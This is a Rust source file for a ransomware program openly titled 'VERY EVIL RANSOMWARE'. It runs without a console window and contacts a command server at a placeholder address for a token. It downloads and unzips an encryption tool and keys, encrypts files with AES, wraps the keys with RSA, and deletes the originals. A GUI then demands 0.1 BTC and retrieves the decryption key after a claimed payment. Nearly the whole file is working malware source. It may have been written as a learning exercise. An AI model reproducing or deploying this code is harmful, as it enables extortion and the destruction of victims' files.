#![windows_subsystem = "windows"]

use std::collections::HashMap;
use std::{env, fs};
use std::fs::{File, remove_file};
use std::io::{self, Read, Write};
use binstall_zip::ZipArchive;

extern crate rsa;
use reqwest::{Client};
use serde_json::Value;
use rsa::{RsaPublicKey, RsaPrivateKey, Pkcs1v15Encrypt, pkcs8};
use rsa::pkcs1::DecodeRsaPrivateKey;
use rsa::rand_core::OsRng;
use rsa::traits::PublicKeyParts;
use druid::widget::{Button, Flex, Label, TextBox};
use druid::{AppLauncher, Data, Env, Lens, Widget, WidgetExt, WindowDesc};

const BLOCK_SIZE: usize = 245; // Maximum size of a block for RSA with PKCS1 padding

#[derive(Clone, Data, Lens)]
struct AppState {
    dir: String,
    token: String,
    input: String,
    dec_label: String,
}

/*

----------------------- ZIP File Management Function ------------------------------------

*/

// Function to extract a ZIP file
fn unzip(input: String) -> Result<(), Box<dyn std::error::Error>> {
    let input_cl = input.clone(); // Clone the input path
    let in_file = File::open(input)?; // Open the ZIP file
    let mut archive = ZipArchive::new(in_file)?; // Create a new ZIP archive from the file

    for i in 0..archive.len() {
        let mut curr_file = archive.by_index(i)?; // Get the current file in the archive
        let file_name = curr_file.name(); // Get the file name
        let mut out_path = env::current_dir()?; // Get the current directory
        out_path.push(file_name); // Add the file name to the output path

        if let Some(parent_dir) = out_path.parent() {
            fs::create_dir_all(parent_dir)?; // Create all necessary parent directories
        }

        if curr_file.is_dir() {
            continue; // If the file is a directory, skip it
        }

        let mut out_file = File::create(&out_path)?; // Create the output file
        std::io::copy(&mut curr_file, &mut out_file)?; // Copy the current file's content to the output file
    }
    fs::remove_file(input_cl)?; // Remove the original ZIP file

    Ok(())
}

/*

----------------------- RSA Encryption Functions ------------------------------------

*/

// Function to encrypt a file with an RSA public key
fn encrypt_file(input_path: &str, public_key_path: String) -> Result<(), Box<dyn std::error::Error>> {
    // Read the public key
    let mut public_key_file = File::open(public_key_path)?;
    let mut public_key_content = String::new();
    public_key_file.read_to_string(&mut public_key_content)?;

    // Convert the public key to an RSAPublicKey object
    let pem_key: RsaPublicKey = pkcs8::DecodePublicKey::from_public_key_pem(&public_key_content)?;

    // Read the file to be encrypted
    let mut input_file = File::open(input_path)?;
    let mut input_content = Vec::new();
    input_file.read_to_end(&mut input_content)?;

    // Encrypt the data in blocks
    let mut encrypted_data = Vec::new();
    for chunk in input_content.chunks(BLOCK_SIZE) {
        let mut rng = OsRng;
        let encrypted_chunk = pem_key.encrypt(&mut rng, Pkcs1v15Encrypt, chunk).expect("Error during encryption");
        encrypted_data.extend_from_slice(&encrypted_chunk);
    }

    // Write the encrypted data to a file with a .enc extension
    let output_path = format!("{}.enc", input_path);
    let mut output_file = File::create(output_path)?;
    output_file.write_all(&encrypted_data)?;
    remove_file(input_path); // Delete the original file after encryption
    Ok(())
}

// Function to decrypt a file with an RSA private key
fn decrypt_file(input_path: &str, private_key_path: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Read the private key
    let mut private_key_file = File::open(private_key_path)?;
    let mut private_key_content = String::new();
    private_key_file.read_to_string(&mut private_key_content)?;

    // Convert the private key to an RSAPrivateKey object
    let pem_key: RsaPrivateKey = RsaPrivateKey::from_pkcs1_pem(&private_key_content)?;

    // Read the encrypted file
    let mut input_file = File::open(input_path)?;
    let mut input_content = Vec::new();
    input_file.read_to_end(&mut input_content)?;

    // Decrypt the data in blocks
    let mut decrypted_data = Vec::new();
    for chunk in input_content.chunks(pem_key.size() as usize) {
        let decrypted_chunk = pem_key.decrypt(Pkcs1v15Encrypt, chunk).expect("Error during decryption");
        decrypted_data.extend_from_slice(&decrypted_chunk);
    }

    // Remove the .enc extension from the filename for the decrypted file
    let output_path = input_path.trim_end_matches(".enc");
    let mut output_file = File::create(output_path)?;
    output_file.write_all(&decrypted_data)?;
    remove_file(input_path); // Delete the encrypted file after decryption
    Ok(())
}

// Function to handle encryption or decryption of multiple files
fn RSA_all(key: String, token: String, dir: &str, mode: &str) {
    let crypter = format!("{dir}\\crypter.exe");
    let aes = format!("{dir}\\{token}_AES.txt");
    if mode == "encrypt" {
        let _ = encrypt_file(&crypter, key.clone());
        let _ = encrypt_file(&aes, key.clone());
    } else if mode == "decrypt" {
        let _ = decrypt_file(&format!("{crypter}.enc"), &key.clone());
        let _ = decrypt_file(&format!("{aes}.enc"), &key.clone());
    }
}

/*

----------------------- Functions for Server Communication ------------------------------------

*/

// Asynchronous function to request a token from a server
async fn token_request(url: &str) -> Result<String, Box<dyn std::error::Error>> {
    // Create an HTTP client
    let client = Client::new();

    // Send a POST request to the server
    let response_result = client.post(url)
        .send().await.expect("Error while sending the request");

    // Initialize a string to store the response
    let mut response = String::new();

    // Check if the request was successful
    if response_result.status().is_success() {
        // Read the response body as a string
        response = response_result.text().await.unwrap();
    }

    // Extract the token from the response
    let token = extract_token(&response)?;
    Ok(token)
}

// Function to extract a token from a JSON response
fn extract_token(response_text: &str) -> Result<String, Box<dyn std::error::Error>> {
    // Parse the JSON response
    let json: Value = serde_json::from_str(response_text)?;

    // Extract the token from the JSON
    let token = json["token"].as_str()
        .ok_or("Token not found in the JSON response")?
        .to_string();

    Ok(token)
}

// Asynchronous function to synchronize and get a token
async fn sync() -> String {
    // Server synchronization URL
    let url = "http://X.X.X.X/sync";

    // Call the token_request function to get a token
    let if_token = token_request(url);

    // Initialize a variable to store the token
    let mut token: String = String::new();

    // Handle the result of the token request
    match if_token.await {
        Ok(if_token) => {
            token = if_token;
        }
        _ => {}
    }
    token
}

// Asynchronous function to download a file from the server
async fn dl(endpoint: &str, token: String) {
    // Create a map to send the token in the request body
    let mut data = HashMap::new();
    data.insert("token", token);

    // Construct the request URL
    let url = format!("http://X.X.X.X/get?id={}", endpoint);

    // Create an HTTP client
    let client = Client::new();

    // Send a POST request with the JSON data
    let response_result = client.post(url).json(&data)
        .send().await.expect("Error during the download request");

    // Check if the request was successful
    if response_result.status().is_success() {
        // Read the response body as a byte sequence
        let bytes = response_result.bytes().await.expect("Error reading the data");

        // Save the data to a file based on the endpoint
        if endpoint == "201" {
            fs::write("download.zip", bytes).expect("Error writing the ZIP file");
        } else if endpoint == "202" {
            fs::write("decrypt_key.txt", bytes).expect("Error writing the decryption key file");
        }
    }
}

// Asynchronous function to download the decryption key
async fn dl_key(token: String) {
    // Call the dl function to download the decryption key
    dl("202", token).await;
}

/*

----------------------- AES Module Management Functions ------------------------------------

*/

// Function to launch the AES encryption program
fn lunch_crypter(AES: String, arg: &str) {
   // Execute the crypter.exe program with the provided arguments
   let output = std::process::Command::new(".\\crypter.exe").arg(arg).arg(AES).arg(".\\TEST").output().expect("Error executing the AES encryption program");
}

// Function to extract the AES key from a file
fn extract_AES_key(path: String) -> Result<String, Box<dyn std::error::Error>> {
    // Open the file containing the AES key
    let mut key_file = File::open(path)?;

    // Read the file's content into a string
    let mut key_content = String::new();
    key_file.read_to_string(&mut key_content)?;

    Ok(key_content)
}

/*

----------------------- GUI Functions ------------------------------------

*/

// Function to build the user interface
fn build_ui() -> impl Widget<AppState> {
    // Create the input field
    let input = TextBox::new()
        .with_placeholder("transaction ID")
        .lens(AppState::input);

    // Text labels
    let output_label = Label::new(|data: &AppState, _: &Env| "YOU'VE BEEN PWNED \n send 0.1 BTC to this address \n HHB97G4G487G478G4IUHD");
    let dec_label = Label::new(|data: &AppState, _: &Env| data.dec_label.clone());

    // Button
    let button = Button::new("verify transaction").on_click(|_ctx, data: &mut AppState, _env| {
        // Check if the input field is not empty
        if !data.input.is_empty() {
            let token = data.token.clone();
            let dir = data.dir.clone();

            // Launch the asynchronous task
            tokio::spawn(async move {
                unlock(dir, token).await;
            });

            data.dec_label = String::from("Transaction verified \n Decryption started \n Wait a couple sec ");
        } else {
            data.dec_label = String::from("Enter a Transaction ID");
        }
    });

    // Build the user interface
    Flex::column().with_child(output_label)
        .with_spacer(8.0)
        .with_child(input)
        .with_spacer(8.0)
        .with_child(button)
        .with_spacer(8.0)
        .with_child(dec_label)
        .with_spacer(8.0)
}

/*

----------------------- General Functions ------------------------------------

*/

// Asynchronous function to lock (encrypt) files
async fn lock() -> Result<String, Box<dyn std::error::Error>> {
    let token = sync().await;
    let clone_token = token.clone();
    if !token.eq("") {
        dl("201", token).await;
        let current_dir = env::current_dir()?;
        let dir = current_dir.to_str().ok_or("Error converting the current directory")?;
        let dl_path = format!("{}/download.zip", dir);
        unzip(dl_path).expect("Error during decompression");
        let to_enc = format!("{dir}\\crypter.exe");
        let pub_key = format!("{dir}\\{clone_token}_public_key.txt");
        let AESpath = format!("{dir}\\{clone_token}_AES.txt");
        let AES = extract_AES_key(AESpath)?;
        lunch_crypter(AES, "encrypt");
        RSA_all(pub_key, clone_token.clone(), dir, "encrypt");
    }
    Ok(clone_token)
}

// Asynchronous function to unlock (decrypt) files
async fn unlock(dir: String, token: String) {
    let token2 = token.clone();
    let _ = dl_key(token.clone()).await;
    RSA_all(format!("{dir}\\decrypt_key.txt"), token.clone(), &dir, "decrypt");
    let AES = extract_AES_key(format!("{dir}\\{token2}_AES.txt")).expect("Error extracting the AES key");
    lunch_crypter(AES, "decrypt");
}

/*

----------------------- MAIN ------------------------------------

*/

#[tokio::main]
async fn main() -> io::Result<()> {
    let token = lock().await.expect("Error during locking");
    let dir = env::current_dir().unwrap().to_str().expect("Error getting the current directory").to_string();

    let main_window = WindowDesc::new(build_ui())
        .title("VERY EVIL RANSOMWARE")
        .window_size((350.0, 250.0));

    let initial_state = AppState {
        dir,
        token,
        input: String::new(),
        dec_label: String::new(),
    };

    AppLauncher::with_window(main_window)
        .launch(initial_state)
        .expect("Failed to launch the application");
    Ok(())
}

